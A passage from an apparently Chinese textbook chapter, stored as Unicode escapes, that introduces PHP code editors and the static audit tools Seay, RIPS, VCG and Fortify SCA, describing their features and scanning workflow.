VS Code\u662F\u5FAE\u8F6F\u516C\u53F8\u5F00\u53D1\u7684\u4E00\u6B3E\u8DE8\u5E73\u53F0\u7684\u6E90\u4EE3\u7801\u7F16\u8F91\u5668\u3002\u8BE5\u5DE5\u5177\u9664\u4E86\u652F\u6301PHP\u8BED\u8A00\u5916\uFF0C\u8FD8\u652F\u6301C++\u3001Java\u3001Python\u3001Go\u7B49\u8BED\u8A00\u3002\u56FE1-16\u4E3AVS Code\u5DE5\u5177\u754C\u9762\uFF0C\u8BE5\u754C\u9762\u5305\u62EC\u662F\u4E09\u4E2A\u90E8\u5206\uFF1A\u6D3B\u52A8\u680F\u3001\u4FA7\u8FB9\u680F\u3001\u7F16\u8F91\u680F\u3002\r
\r
l \u6D3B\u52A8\u680F\uFF1A\u4ECE\u4E0A\u81F3\u4E0B\u4F9D\u6B21\u4E3A\uFF1A\u641C\u7D22\u3001\u4F7F\u7528Git\u3001debug\u8C03\u8BD5\u3001\u4F7F\u7528\u63D2\u4EF6\uFF1B\r
\r
l \u4FA7\u8FB9\u680F\uFF1A\u7528\u4E8E\u6D4F\u89C8\u9879\u76EE\u6587\u4EF6\u6216\u6587\u4EF6\u5939\u7ED3\u6784\uFF1B\r
\r
l \u7F16\u8F91\u680F\uFF1A\u7528\u4E8E\u4EE3\u7801\u7F16\u8F91\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image036.gif)\r
\r
\u56FE1-16 Visual Code\u754C\u9762\r
\r
VS Code\u5DE5\u5177\u7684\u7279\u70B9\u5982\u4E0B\uFF1A\r
\r
l \u652F\u6301Windows\u3001Linux\u3001Mac\u591A\u64CD\u4F5C\u7CFB\u7EDF\u7248\u672C\uFF1B\r
\r
l \u5DE5\u5177\u5B8C\u5168\u5F00\u6E90\u514D\u8D39\u4E14\u96C6\u6210Git\uFF1B\r
\r
l \u652F\u6301\u591A\u79CD\u6587\u4EF6\u683C\u5F0F\uFF0C\u5305\u62EC\uFF1AHTML\u3001CSS\u3001XML\u3001Less\u7B49\uFF1B\r
\r
l \u652F\u6301\u5F3A\u5927\u7684\u63D2\u4EF6\u6269\u5C55\u529F\u80FD\uFF1B\r
\r
l \u652F\u6301\u8C03\u8BD5\u529F\u80FD\u3002\r
\r
\uFF083\uFF09PhpStorm\r
\r
PhpStorm\u662FJetBrains\u516C\u53F8\u5F00\u53D1\u7684\u4E00\u6B3E\u5546\u4E1APHP\u96C6\u6210\u5F00\u53D1\u5DE5\u5177\uFF0C\u65E8\u5728\u63D0\u9AD8\u7528\u6237\u6548\u7387\uFF0C\u53EF\u6DF1\u523B\u7406\u89E3\u7528\u6237\u7684\u7F16\u7801\uFF0C\u63D0\u4F9B\u667A\u80FD\u4EE3\u7801\u8865\u5168\uFF0C\u5FEB\u901F\u5BFC\u822A\u53CA\u5373\u65F6\u9519\u8BEF\u68C0\u67E5\u529F\u80FD\u3002\u56FE1-17\u4E3APhpStorm\u5DE5\u5177\u7684\u9879\u76EE\u754C\u9762\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image038.gif)\r
\r
\u56FE1-17 PhpStorm\u754C\u9762\r
\r
\u8FD1\u51E0\u5E74\u7531\u4E8EJetBrains\u516C\u53F8\u5F00\u53D1\u7684\u5404\u6B3EIDE\u9010\u6E10\u6D41\u884C\uFF0C\u5728\u8FDB\u884C\u4EE3\u7801\u5F00\u53D1\u4E0E\u4EE3\u7801\u5BA1\u8BA1\u65F6\u6B64\u6B3E\u5DE5\u5177\u4E5F\u53D7\u5230\u5F88\u591A\u8BA1\u7B97\u673A\u4ECE\u4E1A\u8005\u7684\u9752\u7750\u3002\u5728\u5BA1\u8BA1\u5927\u578BCMS\u3001PHP\u5E38\u7528\u6846\u67B6\u65F6\u4E5F\u63A8\u8350\u4F7F\u7528\u8BE5\u5DE5\u5177\uFF0C\u8FD9\u4E3B\u8981\u56E0\u4E3A\u8BE5\u5DE5\u5177\u5305\u62EC\u4EE5\u4E0B\u7279\u70B9\uFF1A\r
\r
l \u652F\u6301\u8BED\u6CD5\u9AD8\u4EAE\u3001\u81EA\u52A8\u8865\u5168\u3001\u81EA\u52A8\u626B\u63CF\u68C0\u6D4BPHP\u4EE3\u7801\u4E2D\u8BED\u6CD5\u9519\u8BEF\uFF1B\r
\r
l \u4E0EZend Studio\u76F8\u6BD4\uFF0C\u8BE5\u5DE5\u5177\u5C5E\u4E8E\u8F7B\u91CF\u7EA7\u96C6\u6210\u5F00\u53D1\u5DE5\u5177\uFF0C\u542F\u52A8\u901F\u5EA6\u7565\u5FEB\uFF1B\r
\r
l \u652F\u6301\u672C\u5730\u8C03\u8BD5\u4E0E\u8FDC\u7A0B\u8C03\u8BD5\uFF0C\u6709\u5229\u4E8E\u4EE3\u7801\u5BA1\u8BA1\u4E0E\u6D41\u7A0B\u8D70\u8BFB\u3002\r
\r
## 1.5 \u81EA\u52A8\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
\u5728\u6E90\u4EE3\u7801\u7684\u9759\u6001\u5B89\u5168\u5BA1\u8BA1\u4E2D\uFF0C\u4F7F\u7528\u81EA\u52A8\u5316\u5DE5\u5177\u4EE3\u66FF\u4EBA\u5DE5\u6F0F\u6D1E\u6316\u6398\uFF0C\u53EF\u4EE5\u663E\u8457\u63D0\u9AD8\u5BA1\u8BA1\u5DE5\u4F5C\u7684\u6548\u7387\u3002\u4F7F\u7528\u81EA\u52A8\u5316\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\uFF0C\u662F\u6BCF\u4E00\u4E2A\u4EE3\u7801\u5BA1\u8BA1\u4EBA\u5458\u7684\u5FC5\u5907\u80FD\u529B\u3002\u672C\u8282\u5C06\u4ECB\u7ECD\u56DB\u6B3EPHP\u6E90\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\uFF0C\u5305\u62EC\uFF1ASeay\u3001RIPS\u3001VCG\u3001Fortify SCA\u3002\r
\r
### 1.5.1 Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u662F\u7531\u963F\u91CC\u5DF4\u5DF4\u516C\u53F8\u5C39\u6BC5\u4F7F\u7528C#\u5F00\u53D1\u7684\u4E00\u6B3E\u8FD0\u884C\u4E8EWindows\u64CD\u4F5C\u7CFB\u7EDF\u7684PHP\u4EE3\u7801\u5B89\u5168\u5BA1\u8BA1\u7CFB\u7EDF\u3002\u8BE5\u7CFB\u7EDF\u53EF\u4EE5\u5BA1\u8BA1\u5E38\u89C1\u7684Web\u5B89\u5168\u6F0F\u6D1E\uFF0C\u5982\uFF1ASQL\u6CE8\u5165\u3001\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u3001\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u3001XSS\u7B49\u3002\u5728\u5BF9PHP\u4EE3\u7801\u8FDB\u884C\u767D\u76D2\u6D4B\u8BD5\u65F6\uFF0C\u4F7F\u7528Seay\u4EE3\u7801\u5BA1\u8BA1\u7CFB\u7EDF\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5F80\u5F80\u662F\u8F85\u52A9\u4EE3\u7801\u767D\u76D2\u6D4B\u8BD5\u7684\u4E00\u79CD\u65B9\u6CD5\u3002\u5F88\u591A\u521D\u5B66\u8005\u5728\u5B66\u4E60\u4EE3\u7801\u5BA1\u8BA1\u65F6\u90FD\u4F1A\u9996\u9009Seay\u7CFB\u7EDF\uFF0C\u8FD9\u4E3B\u8981\u662F\u56E0\u4E3A\u8BE5\u5DE5\u5177\u5B89\u88C5\u7B80\u5355\u3001\u5BA1\u8BA1\u7B80\u5355\u3001\u5F00\u6E90\u3001\u5B66\u4E60\u7B80\u5355\u7B49\u7279\u70B9\u3002\r
\r
\u8BE5\u7CFB\u7EDF\u652F\u6301\u7684\u529F\u80FD\u5305\u62EC\uFF1A\u4EE3\u7801\u81EA\u52A8\u5BA1\u8BA1\u3001\u4EE3\u7801\u8C03\u8BD5\u3001\u51FD\u6570\u5B9A\u4F4D\u3001\u63D2\u4EF6\u6269\u5C55\u3001\u81EA\u5B9A\u4E49\u89C4\u5219\u914D\u7F6E\u3001\u6570\u636E\u5E93\u6267\u884C\u76D1\u63A7\u7B49\u3002\r
\r
\u4E0B\u9762\u5BF9Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u7684\u5E38\u89C1\u529F\u80FD\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\uFF081\uFF09 \u4EE3\u7801\u81EA\u52A8\u5BA1\u8BA1\r
\r
\u7528\u6237\u70B9\u51FB\u201C\u65B0\u5EFA\u9879\u76EE\u201D\u6309\u94AE\u5BFC\u5165\u9879\u76EE\uFF0C\u7136\u540E\u5728\u83DC\u5355\u680F\u4E2D\u70B9\u51FB\u201C\u81EA\u52A8\u5BA1\u8BA1\u201D\u518D\u70B9\u51FB\u201C\u5F00\u59CB\u201D\u6309\u94AE\u5373\u53EF\u5BF9\u5DF2\u521B\u5EFA\u9879\u76EE\u8FDB\u884C\u81EA\u52A8\u5316\u5BA1\u3002\u5F53\u5BA1\u8BA1\u7CFB\u7EDF\u53D1\u73B0\u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\u7684\u4EE3\u7801\u540E\u5C06\u628A\u5BA1\u8BA1\u7ED3\u679C\u6253\u5370\u81F3\u5217\u8868\u6846\u3002\u7528\u6237\u53EF\u4EE5\u901A\u8FC7\u53CC\u51FB\u611F\u5174\u8DA3\u7684\u6F0F\u6D1E\u9009\u9879\u5B9A\u4F4D\u81F3\u6307\u5B9A\u4EE3\u7801\uFF0C\u540C\u65F6\u5B9A\u4F4D\u7684\u4EE3\u7801\u5C06\u4EE5\u9AD8\u4EAE\u5F62\u5F0F\u663E\u793A\uFF0C\u56FE1-18\u4E3A\u4EE3\u7801\u81EA\u52A8\u5BA1\u8BA1\u7ED3\u679C\u56FE\u3002\u6CE8\u610F\uFF1A\u7531\u4E8E\u7A0B\u5E8F\u5728\u5F00\u53D1\u8FC7\u7A0B\u4E2D\u4F7F\u7528\u7684\u7F16\u7801\u65B9\u5F0F\u4E0D\u540C\u5C06\u5BFC\u81F4Seay\u5BFC\u5165\u9879\u76EE\u540E\u5B58\u5728\u4E71\u7801\u60C5\u51B5\uFF0C\u8FD9\u9700\u8981\u7528\u6237\u70B9\u51FB\u201C\u7F16\u7801\u201D\u9009\u9879\u5207\u6362\u4E3A\u4E0D\u663E\u793A\u4E71\u7801\u7684\u7F16\u7801\u65B9\u5F0F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image040.jpg)\r
\r
\u56FE1-18 Seay\u81EA\u52A8\u5BA1\u8BA1\u56FE\r
\r
\uFF082\uFF09 \u5B9A\u4F4D\u51FD\u6570\u529F\u80FD\r
\r
\u5B9A\u4F4D\u51FD\u6570\u529F\u80FD\u5C06\u4ECE\u7A0B\u5E8F\u4EE3\u7801\u4E2D\u8FC5\u901F\u5B9A\u4F4D\u51FA\u6307\u5B9A\u51FD\u6570\u7684\u4F4D\u7F6E\uFF0C\u8BE5\u529F\u80FD\u5728\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u65F6\u53D1\u6325\u4F5C\u7528\u3002\u5047\u8BBE\u7528\u6237\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u65F6\u53D1\u73B0dvwaHtmlEcho\u51FD\u6570\u9700\u8981\u67E5\u770B\uFF0C\u53EF\u4EE5\u901A\u8FC7\u53F3\u952E\u8BE5\u51FD\u6570\uFF0C\u7136\u540E\u70B9\u51FB\u201C\u5B9A\u4F4D\u51FD\u6570\u201D\u67E5\u770B\u8BE5\u51FD\u6570\u5728\u7A0B\u5E8F\u4E2D\u7684\u5177\u4F53\u5B9E\u73B0\u4EE3\u7801\uFF0C\u4ECE\u800C\u5FEB\u901F\u5BF9\u5206\u6790\u8BE5\u51FD\u6570\u5185\u5BB9\uFF0C\u5982\u56FE1-19\u6240\u793A\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image042.jpg)\r
\r
\u56FE1-19 Seay\u5B9A\u4F4D\u51FD\u6570\u529F\u80FD\u56FE\r
\r
\uFF083\uFF09\u5168\u5C40\u641C\u7D22\r
\r
\u7528\u6237\u53EF\u901A\u8FC7\u5728\u9009\u9879\u5361\u4E2D\u9009\u62E9\u201C\u5168\u5C40\u641C\u7D22\u201D\u529F\u80FD\uFF0C\u7136\u540E\u5728\u5185\u5BB9\u5904\u8F93\u5165\u641C\u7D22\u5173\u952E\u5B57\u5373\u53EF\u5728\u9879\u76EE\u4E2D\u5168\u5C40\u641C\u7D22\u6307\u5B9A\u5185\u5BB9\u3002\u8BE5\u65B9\u6CD5\u53EF\u7528\u4E8E\u641C\u7D22\u5E38\u89C1Web\u5B89\u5168\u6F0F\u6D1E\u7684\u5173\u952E\u51FD\u6570\uFF0C\u4F8B\u5982\uFF1AWeb\u5B89\u5168\u6F0F\u6D1E\u7684\u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570include\u3001include_once\u3001require\u3001fopen\u90FD\u53EF\u901A\u8FC7\u5168\u5C40\u641C\u7D22\u529F\u80FD\u8FDB\u884C\u67E5\u627E\uFF0C\u5982\u56FE1-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image044.jpg)\r
\r
\u56FE1-20 Seay\u5168\u5C40\u641C\u7D22\u56FE\r
\r
\uFF084\uFF09\u4EE3\u7801\u8C03\u8BD5\r
\r
  \u8BE5\u529F\u80FD\u53EF\u7528\u4E8E\u5BF9\u90E8\u5206\u4EE3\u7801\u8FDB\u884C\u6267\u884C\uFF0C\u5206\u6790\u5176\u6267\u884C\u7ED3\u679C\u3002\u7528\u6237\u53EF\u901A\u8FC7\u9009\u4E2D\u5F85\u6D4B\u8BD5\u4EE3\u7801\uFF0C\u7136\u540E\u53F3\u952E\u70B9\u51FB\u201C\u8C03\u8BD5\u9009\u4E2D\u201D\u5207\u6362\u81F3\u8C03\u8BD5\u754C\u9762\u89C2\u5BDFPHP\u4EE3\u7801\u6267\u884C\u7ED3\u679C\uFF0C\u5982\u56FE1-21\u6240\u793A\u3002\u4F46\u662F\uFF0C\u8BE5\u529F\u80FD\u53EA\u80FD\u7528\u4E8E\u7B80\u5355\u7684PHP\u4EE3\u7801\u8C03\u8BD5\uFF0C\u590D\u6742\u4EE3\u7801\u5EFA\u8BAE\u4F7F\u7528IDE\u5F00\u53D1\u5DE5\u5177\u8FDB\u884C\u5355\u6B65\u8C03\u8BD5\u6548\u679C\u66F4\u4F73\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image046.jpg)\r
\r
\u56FE1-21 Seay\u4EE3\u7801\u8C03\u8BD5\u529F\u80FD\u56FE\r
\r
\uFF085\uFF09\u5BA1\u8BA1\u63D2\u4EF6\u529F\u80FD\r
\r
Seay\u6E90\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u652F\u6301\u5B89\u88C5\u5BA1\u8BA1\u63D2\u4EF6\uFF0C\u63D2\u4EF6\u7684\u5F00\u53D1\u975E\u5E38\u7B80\u5355\uFF0C\u53EA\u9700\u8981\u5C06\u63D2\u4EF6\u7684dll\u6587\u4EF6\u653E\u5165\u5230\u5B89\u88C5\u76EE\u5F55\u4E0B\u7684plugins\u6587\u4EF6\u5939\u5185\u5373\u53EF\u81EA\u52A8\u52A0\u8F7D\u63D2\u4EF6\u3002\u8BE5\u7CFB\u7EDF\u5C06\u9ED8\u8BA4\u63D0\u4F9B\u4E09\u6B3E\u63D2\u4EF6\uFF0C\u5982\u56FE\u6240\u793A\uFF1A\u4FE1\u606F\u6CC4\u9732\u5BA1\u8BA1\u3001Mysql\u76D1\u63A71.0\u3001\u6D4B\u8BD5\u63D2\u4EF61.0\u3002\r
\r
l \u4FE1\u606F\u6CC4\u9732\u5BA1\u8BA1\uFF1A\u901A\u8FC7\u8F93\u5165\u201C\u7AD9\u70B9\u5730\u5740\u201D\u548C\u201CCookie\u201D\u5BF9\u6307\u5B9A\u7684URL\u8DEF\u5F84\u8FDB\u884C\u4FE1\u606F\u6CC4\u9732\u626B\u63CF\uFF0C\u5BF9\u8BE5\u7AD9\u70B9\u654F\u611F\u4FE1\u606F\u8FDB\u884C\u6536\u96C6\u3002\r
\r
l Mysql\u76D1\u63A7\uFF1A\u901A\u8FC7\u8F93\u5165\u201C\u4E3B\u673A\u201D\u3001\u201C\u7528\u6237\u201D\u3001\u201C\u5BC6\u7801\u201D\u8FDE\u63A5\u4E3B\u673A\u7684MySQL\u6570\u636E\u5E93\uFF0C\u67E5\u770B\u6570\u636E\u5E93\u6267\u884C\u7684SQL\u8BED\u53E5\u5E76\u4E0E\u540E\u7AEF\u4EE3\u7801\u7ED3\u5408\u5BA1\u8BA1\u4EE3\u7801\u3002\r
\r
l \u6D4B\u8BD5\u63D2\u4EF6\uFF1A\u8BE5\u63D2\u4EF6\u7528\u6765\u6D4B\u8BD5Seay\u5BA1\u8BA1\u5DE5\u5177\u7684\u8FD0\u884C\u60C5\u51B5\uFF0C\u6D4B\u8BD5\u7684\u529F\u80FD\u5305\u62EC\uFF1A\u201C\u4FEE\u6539\u6807\u9898\u201D\u3001\u201C\u589E\u52A0tab\u201D\u3001\u201C\u83B7\u53D6\u7F16\u7801\u201D\u3001\u201C\u83B7\u53D6\u8DEF\u5F84\u201D\u3002\r
\r
### 1.5.2 RIPS\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
RIPS\u662F\u4E00\u6B3E\u5177\u6709\u8F83\u5F3A\u6F0F\u6D1E\u6316\u6398\u80FD\u529B\u7684\u81EA\u52A8\u5316\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\u8BE5\u5DE5\u5177\u4F7F\u7528PHP\u8BED\u8A00\u7F16\u5199\u7684\uFF0C\u53EF\u7528\u4E8E\u9759\u6001\u5BA1\u8BA1PHP\u4EE3\u7801\u7684\u5B89\u5168\u6027\u3002\u8BE5\u5DE5\u5177\u53EF\u68C0\u6D4BXSS\u3001SQL\u6CE8\u5165\u3001\u6587\u4EF6\u6CC4\u9732\u3001\u6587\u4EF6\u5305\u542B\u7B49\u591A\u79CD\u5B89\u5168\u6F0F\u6D1E\u3002\u8BE5\u5DE5\u5177\u7684\u7279\u70B9\u5305\u62EC\uFF1A\u6807\u8BB0\u6F0F\u6D1E\u7684\u4EE3\u7801\u884C\u3001\u51FD\u6570\u5B9A\u4E49\u548C\u8C03\u7528\u7075\u6D3B\u8DF3\u8F6C\u3001\u53EF\u89C6\u5316\u56FE\u8868\u7B49\u3002\u5BF9\u4E8E\u4E00\u6B3E\u514D\u8D39\u7684\u5F00\u6E90\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u800C\u8A00\uFF0CRIPS\u5DF2\u7ECF\u505A\u5F97\u76F8\u5F53\u4E0D\u9519\u4E86\uFF0C\u56E0\u4E3A\u5B83\u4E0D\u4EC5\u662F\u4E00\u6B3E\u81EA\u52A8\u5B9A\u4F4D\u6F0F\u6D1E\u7684\u626B\u63CF\u5668\uFF0C\u540C\u65F6\u66F4\u4FA7\u91CD\u4E8E\u5982\u679C\u53D1\u73B0\u4EE3\u7801\u95EE\u9898\u3001\u5229\u7528\u6F0F\u6D1E\u3001\u4FEE\u590D\u6F0F\u6D1E\u65B9\u9762\u3002\r
\r
\uFF081\uFF09\u4EE3\u7801\u81EA\u52A8\u5BA1\u8BA1\r
\r
\u7528\u6237\u53EF\u901A\u8FC7\u5728\u201Cpath/file\u201D\u9009\u9879\u4E2D\u8F93\u5165\u9700\u5BA1\u8BA1\u7684\u4EE3\u7801\u8DEF\u5F84\uFF0C\u7136\u540E\u586B\u5199\u626B\u63CF\u8BBE\u7F6E\u9009\u9879\u5373\u53EF\u70B9\u51FB\u201Cscan\u201D\u6309\u94AE\u5B8C\u6210\u81EA\u52A8\u5316\u626B\u63CF\u3002\u56FE1-22\u4E3ARIPS\u626B\u63CFDVWA\u9776\u573A\u5E73\u53F0\u7684\u626B\u63CF\u7ED3\u679C\u3002RIPS\u626B\u63CF\u7ED3\u679C\u901A\u8FC7\u53EF\u89C6\u5316\u56FE\u5F62\u4F7F\u5F97\u626B\u63CF\u7ED3\u679C\u66F4\u52A0\u76F4\u89C2\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image048.jpg)\r
\r
\u56FE1-22 RIPS\u626B\u63CF\u7ED3\u679C\u56FE\r
\r
\uFF082\uFF09\u626B\u63CF\u7ED3\u679C\u5206\u7C7B\u663E\u793A\r
\r
RIPS\u652F\u6301\u56DB\u79CD\u7C7B\u578B\u663E\u793A\u6216\u9690\u85CF\u626B\u63CF\u7ED3\u679C\uFF0C\u5206\u522B\u662F\uFF1Afile\uFF08\u626B\u63CF\u6587\u4EF6\uFF09\u3001user input\uFF08\u7528\u6237\u8F93\u5165\uFF09\u3001stats\uFF08\u626B\u63CF\u72B6\u6001\uFF09\u3001functions\uFF08\u626B\u63CF\u7684\u51FD\u6570\uFF09\u3002\u7528\u6237\u53EF\u901A\u8FC7\u70B9\u51FB\u6307\u5B9A\u6F0F\u6D1E\u67E5\u770B\u5B58\u5728\u6F0F\u6D1E\u7684PHP\u4EE3\u7801\u53CA\u4EE3\u7801\u4F4D\u7F6E\u3002\u56FE1-23\u7ED9\u51FARIPS\u626B\u63CF\u7ED3\u679C\u4E2D\u53EF\u80FD\u5B58\u5728\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u4EE3\u7801\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image050.jpg)\r
\r
\u56FE1-23 \u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\u626B\u63CF\u56FE\r
\r
### 1.5.3 VCG\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
VCG\u662F\u4E00\u6B3E\u7528\u4E8EC++\u3001C\u3001PHP\u3001Java\u7684\u81EA\u52A8\u5316\u4EE3\u7801\u5B89\u5168\u5BA1\u67E5\u5DE5\u5177\uFF0C\u5B83\u57FA\u4E8E\u5B57\u5178\u5B9E\u73B0\u626B\u63CF\u529F\u80FD\uFF0C\u4ECE\u800C\u5BF9\u6E90\u4EE3\u7801\u4E2D\u6240\u6709\u53EF\u80FD\u5B58\u5728\u7684\u98CE\u9669\u51FD\u6570\u548C\u6587\u672C\u505A\u5FEB\u901F\u5B9A\u4F4D\u3002\u901A\u8FC7\u5339\u914D\u5B57\u5178\u7684\u65B9\u5F0F\u67E5\u627E\u53EF\u80FD\u5B58\u5728\u98CE\u9669\u7684\u6E90\u4EE3\u7801\u7247\u6BB5\u3002\u4E0ERIPS\u4FA7\u91CD\u70B9\u4E0D\u540C\uFF0C\u8BE5\u5DE5\u5177\u5E76\u4E0D\u6DF1\u5EA6\u53D1\u6398\u5E94\u7528\u6F0F\u6D1E\u3002\u5B83\u53EA\u80FD\u4F5C\u4E3A\u4E00\u4E2A\u5FEB\u901F\u5B9A\u4F4D\u6E90\u4EE3\u7801\u98CE\u9669\u51FD\u6570\u7684\u8F85\u52A9\u5DE5\u5177\u4F7F\u7528\u3002\r
\r
\u4F7F\u7528\u524D\u7528\u6237\u70B9\u51FBSetting\u9009\u9879\uFF0C\u9009\u62E9\u626B\u63CF\u7684\u76EE\u6807\u8BED\u8A00\u7C7B\u578B\u3002\u7136\u540E\u70B9\u51FBFile->New Target Directory\u9009\u9879\uFF0C\u9009\u62E9\u9700\u8981\u626B\u63CF\u7684\u6E90\u4EE3\u7801\u6587\u4EF6\u5B58\u653E\u76EE\u5F55\uFF0C\u70B9\u51FBScan->Full Scan\u9009\u9879\u8FDB\u884C\u626B\u63CF\u3002\u56FE1-24\u4E3AVCG\u626B\u63CFDVWA\u5E73\u53F0\u7684\u7ED3\u679C\uFF0CPHP\u4EE3\u7801\u5C06\u6309\u7167\u5B89\u5168\u5A01\u80C1\u7B49\u7EA7\u8FDB\u884C\u5212\u5206\uFF0C\u540C\u65F6\u4F1A\u5217\u4E3E\u51FA\u53EF\u80FD\u5B58\u5728\u5B89\u5168\u95EE\u9898\u7684\u4EE3\u7801\u884C\u6570\u53CA\u53D8\u91CF\u540D\u79F0\u7B49\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image052.jpg)\r
\r
\u56FE1-24 VCG\u5BA1\u8BA1\u5DE5\u5177\u754C\u9762\r
\r
### 1.5.4 Fortify SCA\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\r
\r
Fortify SCA\u662F\u4E00\u6B3E\u5546\u4E1A\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u3002\u8BE5\u5DE5\u5177\u867D\u4EF7\u683C\u6602\u8D35\uFF0C\u4F46\u914D\u6709\u8BE6\u7EC6\u7684\u4F7F\u7528\u6587\u6863\u4E14\u67E5\u9605\u65B9\u4FBF\u3002Fortify SCA\u7684\u4EE3\u7801\u5BA1\u8BA1\u529F\u80FD\u4F9D\u8D56\u4E8E\u8BE5\u516C\u53F8\u5185\u90E8\u5F00\u53D1\u7684\u89C4\u5219\u5E93\u6587\u4EF6\uFF0C\u53EF\u4EE5\u901A\u8FC7\u4E0B\u8F7D\u6700\u65B0\u7684\u89C4\u5219\u5E93\uFF0C\u5C06\u89C4\u5219\u5E93\u62F7\u8D1D\u81F3\u5B89\u88C5\u76EE\u5F55\u4E0B\u8FDB\u884C\u4F7F\u7528\u3002\r
\r
\u8BE5\u5DE5\u5177\u7684\u7279\u70B9\u5305\u62EC\uFF1A\r
\r
l \u652F\u6301IDE\u63D2\u4EF6\u529F\u80FD\uFF0C\u80FD\u4E0E\u73B0\u6709\u7684\u96C6\u6210\u5F00\u53D1\u5DE5\u5177\u8054\u52A8\u5BA1\u8BA1\uFF1B\r
\r
l \u76F8\u6BD4\u4E8E\u5F00\u6E90\u5BA1\u8BA1\u8F6F\u4EF6\uFF0C\u5176\u5BA1\u8BA1\u7ED3\u679C\u66F4\u52A0\u8BE6\u7EC6\uFF1B\r
\r
l \u57FA\u4E8E\u4E94\u79CD\u5206\u6790\u5F15\u64CE\uFF08\u6570\u636E\u6D41\u3001\u63A7\u5236\u6D41\u3001\u8BED\u4E49\u3001\u7ED3\u6784\u3001\u914D\u7F6E\uFF09\u8FDB\u884C\u4EE3\u7801\u9759\u6001\u5206\u6790\uFF1B\r
\r
l \u76EE\u524D\u652F\u6301\u8BED\u8A00\u5BA1\u8BA1\u6700\u591A\u7684\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\uFF08Java\u3001JSP\u3001PHP\u7B49\u591A\u79CD\u8BED\u8A00\uFF09\uFF1B\r
\r
RIPS\u548CFortify SCA\u90FD\u662F\u9759\u6001\u6DF1\u5EA6\u5206\u6790\u6E90\u4EE3\u7801\u6F0F\u6D1E\u7684\u5229\u5668\uFF0C\u5B83\u4EEC\u4F7F\u7528\u5404\u81EA\u7684\u6280\u672F\u5BF9\u5E94\u7528\u7A0B\u5E8F\u6267\u884C\u8FC7\u7A0B\u8FDB\u884C\u4E86\u8FFD\u8E2A\u5206\u6790\uFF0C\u5E76\u8FDB\u884C\u6DF1\u5C42\u6B21\u7684\u6F0F\u6D1E\u6316\u6398\u5DE5\u4F5C\u3002RIPS\u6613\u4E8E\u90E8\u7F72\u548C\u4F7F\u7528\uFF0C\u53EF\u4EE5\u4F5C\u4E3A\u7B80\u5355\u5E94\u7528\u529F\u80FD\u7684\u81EA\u52A8\u5316\u5BA1\u8BA1\u5206\u6790\u5DE5\u5177\u3002\u800CFortify SCA\u529F\u80FD\u66F4\u4E3A\u5F3A\u5927\uFF0C\u53EF\u4EE5\u80DC\u4EFB\u8F83\u4E3A\u590D\u6742\u7684\u5E94\u7528\u81EA\u52A8\u5316\u5206\u6790\u3002\u5728\u5B9E\u9645\u5BA1\u8BA1\u5DE5\u4F5C\u4E2D\u53EF\u4EE5\u7ED3\u5408\u4F7F\u7528\u4E24\u79CD\u5DE5\u5177\uFF0C\u53D6\u957F\u8865\u77ED\u3002\r
\r
\u81EA\u52A8\u5316\u7684\u9759\u6001\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u53EF\u4EE5\u8282\u7701\u4EE3\u7801\u5BA1\u8BA1\u7684\u4EBA\u529B\u6210\u672C\uFF0C\u662F\u63D0\u9AD8\u4EE3\u7801\u5BA1\u8BA1\u6548\u7387\u7684\u91CD\u8981\u624B\u6BB5\u3002\u4F46\u81EA\u52A8\u5316\u5DE5\u5177\u5E76\u975E\u5B8C\u5168\u667A\u80FD\uFF0C\u4E0E\u6240\u6709\u7684\u6F0F\u6D1E\u626B\u63CF\u5DE5\u5177\u4E00\u6837\uFF0C\u8BEF\u62A5\u7387\u4ECD\u662F\u4E00\u4E2A\u73B0\u5B9E\u7684\u95EE\u9898\u3002\u56E0\u6B64\uFF0C\u62A5\u8868\u4E2D\u663E\u793A\u7684\u6F0F\u6D1E\u9700\u8981\u5BA1\u8BA1\u4EBA\u5458\u8FDB\u4E00\u6B65\u786E\u8BA4\u3002\u6B64\u5916\uFF0C\u81EA\u52A8\u5316\u5DE5\u5177\u8FD8\u6709\u4E00\u4E2A\u5F88\u5927\u7684\u5C40\u9650\u6027\uFF1